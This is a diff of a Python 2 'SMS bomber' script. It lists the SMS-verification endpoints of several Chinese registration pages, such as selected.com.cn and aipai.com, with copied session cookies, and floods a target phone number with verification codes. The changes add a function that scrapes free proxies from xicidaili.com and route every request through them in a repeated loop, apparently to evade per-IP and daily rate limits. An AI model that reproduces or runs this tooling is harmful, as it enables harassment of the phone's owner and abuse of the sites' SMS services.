@@ -4,17 +4,21 @@
 import urllib
 import urllib2
 from time import sleep
+import sys
+from bs4 import BeautifulSoup
 
 ua = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
-phone = "159xxxxxxx"
+phone = "159xxx"
+
+valid_proxy = set()
 
 # inurl:register
 request_data = [
-    {  # {"result":"true","resultMessage":"验证码已发送，请注意查收短信！","resultType":"SUCCESS","token":""}
-       "url": "http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined",
-       "data": {"receiveMobileNo": phone},
-       "headers": {"User-Agent": ua, "Referer": "http://d.fcyun.com/register?dyzc2"}
-       },
+    # {  # {"result":"true","resultMessage":"验证码已发送，请注意查收短信！","resultType":"SUCCESS","token":""}
+    #    "url": "http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined",
+    #    "data": {"receiveMobileNo": phone},
+    #    "headers": {"User-Agent": ua, "Referer": "http://d.fcyun.com/register?dyzc2"}
+    #    },
 
     {
         "url": "http://www.jc258.cn/signup/send_sms",
@@ -74,56 +78,101 @@ request_data = [
                    'Referer': 'https://www.veromoda.com.cn/webapp/wcs/stores/servlet/UserRegistrationForm?new=Y&catalogId=10001&langId=-7&storeId=10151&registerWay=new',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest',
-                   'Cookie': 'JSESSIONID=0000RUBoPv9MRFC1VwsNbwCXXE5:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3d%2dJPaIdaDtkGeOrq%2dAFZ%5f6%5fHXxgfAsGYRCR9YsHovxdn98KImqfd%5fofHDZO%5f1ZylvL9ltl2ZiLWKVnfW9v3oQya%26wd%3d%26eqid%3df9a70e580005a06300000005571f2c8a; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=g54p%2fCkGAYNBl%2fb3l7tgpLslTQc%3d%0a%3b2016%2d04%2d26+16%3a53%3a51%2e209%5f1461660831202%2d1290%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro4Q7PawVEeQ68P%0aT%2fAWPSFU3UHl%2b10fy%2fCLiTp%2besE1HQAS3plo3E86GL9%2fZrZlOE1MHTUgPZZ1iC4%3d; WC_GENERIC_ACTIVITYDATA=[177411825%3atrue%3afalse%3a0%3adEQrYnBKWtfhqVq8gJSo1GkgHsw%3d][com.ibm.commerce.context.audit.AuditContext|1461660831202%2d1290][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cookiesession1=RIINNBKCED9GV3MA0CUU1O9AOMGDKD05; cmTPSet=Y; CoreID6=67314785945414616608778&ci=90398199; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; {}=1461661257986; Hm_lvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461660878; Hm_lpvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461663169; 90398199_clogin=l=1461660877&v=1&e=1461664980115'.format(phone)}
+                   'Cookie': 'JSESSIONID=0000RUBoPv9MRFC1VwsNbwCXXE5:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3d%2dJPaIdaDtkGeOrq%2dAFZ%5f6%5fHXxgfAsGYRCR9YsHovxdn98KImqfd%5fofHDZO%5f1ZylvL9ltl2ZiLWKVnfW9v3oQya%26wd%3d%26eqid%3df9a70e580005a06300000005571f2c8a; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=g54p%2fCkGAYNBl%2fb3l7tgpLslTQc%3d%0a%3b2016%2d04%2d26+16%3a53%3a51%2e209%5f1461660831202%2d1290%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro4Q7PawVEeQ68P%0aT%2fAWPSFU3UHl%2b10fy%2fCLiTp%2besE1HQAS3plo3E86GL9%2fZrZlOE1MHTUgPZZ1iC4%3d; WC_GENERIC_ACTIVITYDATA=[177411825%3atrue%3afalse%3a0%3adEQrYnBKWtfhqVq8gJSo1GkgHsw%3d][com.ibm.commerce.context.audit.AuditContext|1461660831202%2d1290][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cookiesession1=RIINNBKCED9GV3MA0CUU1O9AOMGDKD05; cmTPSet=Y; CoreID6=67314785945414616608778&ci=90398199; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; {}=1461661257986; Hm_lvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461660878; Hm_lpvt_d83ccc61891ad3ca57cc4bfec7d4e1e3=1461663169; 90398199_clogin=l=1461660877&v=1&e=1461664980115'.format(
+                       phone)}
        },
 
-    { # 每天验证码只会发送5次    !Ww L(n----true
-        "url": "https://www.selected.com.cn/webapp/wcs/stores/servlet/BSSendMobileCode",
-        "data": {'storeId': '10151',
-                 'catalogId': '10001',
-                 'langId': '-7',
-                 'mobile': phone,
-                 'params': 'REGISTER'},
-        "headers": {'Accept': 'application/json, text/javascript, */*; q=0.01',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'Accept-Language': 'zh-CN,zh;q=0.8',
-                    'Connection': 'keep-alive',
-                    'Content-Length': '74',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'www.selected.com.cn',
-                    'Origin': 'https://www.selected.com.cn',
-                    'Referer': 'https://www.selected.com.cn/webapp/wcs/stores/servlet/UserRegistrationForm?new=Y&catalogId=10001&langId=-7&storeId=10151&registerWay=new&flag=N',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'Cookie': 'JSESSIONID=00004sFgIPFK7iG4Pdeza8qI_zQ:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3dayMy2zRIZBPkrY2VXfsgQhTGM%2dpzwJ4%5f6dDG6XYL62tbiCkqBW2Tfzu5e38YSZ%2dhBd82w9DKx2B6Cg33ZykP2q%26wd%3d%26eqid%3dce87a7cb0008164c00000005571f3327; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=sN2nYVfs6KTWIRvtaxwv8iRZY3I%3d%0a%3b2016%2d04%2d26+17%3a21%3a49%2e291%5f1461662509282%2d72603%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro41HNmPVAy58qc%0a5cCbcqQD4qKtJcGYzgV9pYWfOgZTsA%2f9XdyGmyB3wByII%2f%2bFQNd1GnUiBvuqTSo%3d; WC_GENERIC_ACTIVITYDATA=[118865575%3atrue%3afalse%3a0%3adG%2bk8OJRCpfBZSyHMaASu411bfA%3d][com.ibm.commerce.context.audit.AuditContext|1461662509282%2d72603][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cmTPSet=Y; CoreID6=03583138944514616625486&ci=90398212; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; Hm_lvt_454621c4e6429501da2aa6df0c2f7f9c=1461662549; Hm_lpvt_454621c4e6429501da2aa6df0c2f7f9c=1461662553; 90398212_clogin=l=1461662548&v=1&e=1461664370055'
-                    }
-    },
+    {  # 每天验证码只会发送5次    !Ww L(n----true
+       "url": "https://www.selected.com.cn/webapp/wcs/stores/servlet/BSSendMobileCode",
+       "data": {'storeId': '10151',
+                'catalogId': '10001',
+                'langId': '-7',
+                'mobile': phone,
+                'params': 'REGISTER'},
+       "headers": {'Accept': 'application/json, text/javascript, */*; q=0.01',
+                   'Accept-Encoding': 'gzip, deflate',
+                   'Accept-Language': 'zh-CN,zh;q=0.8',
+                   'Connection': 'keep-alive',
+                   'Content-Length': '74',
+                   'Content-Type': 'application/x-www-form-urlencoded',
+                   'Host': 'www.selected.com.cn',
+                   'Origin': 'https://www.selected.com.cn',
+                   'Referer': 'https://www.selected.com.cn/webapp/wcs/stores/servlet/UserRegistrationForm?new=Y&catalogId=10001&langId=-7&storeId=10151&registerWay=new&flag=N',
+                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
+                   'X-Requested-With': 'XMLHttpRequest',
+                   'Cookie': 'JSESSIONID=00004sFgIPFK7iG4Pdeza8qI_zQ:18aol2v3t; REFERRER=https%3a%2f%2fwww%2ebaidu%2ecom%2flink%3furl%3dayMy2zRIZBPkrY2VXfsgQhTGM%2dpzwJ4%5f6dDG6XYL62tbiCkqBW2Tfzu5e38YSZ%2dhBd82w9DKx2B6Cg33ZykP2q%26wd%3d%26eqid%3dce87a7cb0008164c00000005571f3327; WC_SESSION_ESTABLISHED=true; WC_PERSISTENT=sN2nYVfs6KTWIRvtaxwv8iRZY3I%3d%0a%3b2016%2d04%2d26+17%3a21%3a49%2e291%5f1461662509282%2d72603%5f10151; WC_ACTIVEPOINTER=%2d7%2c10151; WC_USERACTIVITY_-1002=%2d1002%2c10151%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cqDRVbHedtn%2bIlb%2byDjkaHEDKhujNWQlXvJ0S6nhTb0FTYKBF1PFyO4IPPoGGUro41HNmPVAy58qc%0a5cCbcqQD4qKtJcGYzgV9pYWfOgZTsA%2f9XdyGmyB3wByII%2f%2bFQNd1GnUiBvuqTSo%3d; WC_GENERIC_ACTIVITYDATA=[118865575%3atrue%3afalse%3a0%3adG%2bk8OJRCpfBZSyHMaASu411bfA%3d][com.ibm.commerce.context.audit.AuditContext|1461662509282%2d72603][com.ibm.commerce.store.facade.server.context.StoreGeoCodeContext|null%26null%26null%26null%26null%26null][CTXSETNAME|Store][com.ibm.commerce.context.globalization.GlobalizationContext|%2d7%26CNY%26%2d7%26CNY][com.ibm.commerce.catalog.businesscontext.CatalogContext|10001%26null%26false%26false%26false][com.ibm.commerce.context.base.BaseContext|10151%26%2d1002%26%2d1002%26%2d1][com.ibm.commerce.context.experiment.ExperimentContext|null][com.ibm.commerce.context.entitlement.EntitlementContext|10003%2610003%26null%26%2d2000%26null%26null%26null][com.ibm.commerce.giftcenter.context.GiftCenterContext|null%26null%26null]; cmTPSet=Y; CoreID6=03583138944514616625486&ci=90398212; WC_AUTHENTICATION_-1002=%2d1002%2c1j%2fVym5SBrpDD40fejiD%2f%2fWuG%2bs%3d; Hm_lvt_454621c4e6429501da2aa6df0c2f7f9c=1461662549; Hm_lpvt_454621c4e6429501da2aa6df0c2f7f9c=1461662553; 90398212_clogin=l=1461662548&v=1&e=1461664370055'
+                   }
+       },
 
     {
-       "url": "http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={}".format(phone),
-       "data": {"receiveMobileNo": phone},
-       "headers": {"User-Agent": ua, "Referer": "http://www.aipai.com/signup.php?_t_t_t=0.3551206151023507"}
-       },
+        "url": "http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile={}".format(phone),
+        "data": {"receiveMobileNo": phone},
+        "headers": {"User-Agent": ua, "Referer": "http://www.aipai.com/signup.php?_t_t_t=0.3551206151023507"}
+    },
 ]
 
 
-def attack(para):
+def attack(para, proxy):
     data = para["data"]
     if data:
         data = urllib.urlencode(data)
+
+    if proxy:
+        proxies = {'http': 'http://{0}:{1}'.format(*proxy)}
+        handler = urllib2.ProxyHandler(proxies)
+        opener = urllib2.build_opener(handler)
+        urllib2.install_opener(opener)
+
     try:
         request = urllib2.Request(para["url"], data, para["headers"])
-        response = urllib2.urlopen(request)
+        response = urllib2.urlopen(request, timeout=2)
         ret = response.read()
-        print ret
-        print "attack success!!!"
+        # print ret
+        print "attack success!!!  proxy: ", proxy
+        valid_proxy.add(proxy)
     except Exception, e:
-        print e
         print "attack failed!!!"
 
 
+def get_proxy(pages=1):
+    ipadds = []
+
+    def get_ip_add(data):
+        soup = BeautifulSoup(data, "lxml")
+        trs = soup.find_all('tr', {'class': 'odd'}) + soup.find_all('tr', {'class': ''})
+        all_text = []
+        for tr in trs:
+            tds = tr.find_all('td')
+            texts = []
+            for td in tds:
+                text = td.get_text()
+                texts.append(text)
+            all_text.append(texts)
+
+        for t in all_text:
+            if t:
+                ipadds.append([t[1], t[2]])
+
+    for page in range(1, pages + 1):
+        request = urllib2.Request("http://www.xicidaili.com/nn/{}".format(str(page)), headers={"User-Agent": ua})
+        response = urllib2.urlopen(request)
+        data = response.read()
+        get_ip_add(data)
+
+    return ipadds
+
+
 if __name__ == "__main__":
-    for i in range(1):
-        for para in request_data:
-            # print para
-            attack(para)
+    proxy_info = get_proxy()
+    # proxy_info = [
+    #     [u'61.232.254.39', u'3128'], [u'222.75.59.10', u'808'],
+    #     [u'119.135.187.42', u'80'], [u'218.29.182.89', u'808'], [u'119.188.94.145', u'80'], [u'125.71.243.20', u'8888'],
+    #     [u'119.188.94.145', u'80'], [u'112.124.113.155', u'80'], [u'114.234.213.201', u'8118'],
+    #     [u'60.29.59.210', u'80'], [u'122.141.74.114', u'3128']]
+    for i in range(5):
+        for proxy in proxy_info:
+            for para in request_data:
+                attack(para, proxy)
+            # sys.exit()
+        # break
+    print list(valid_proxy)
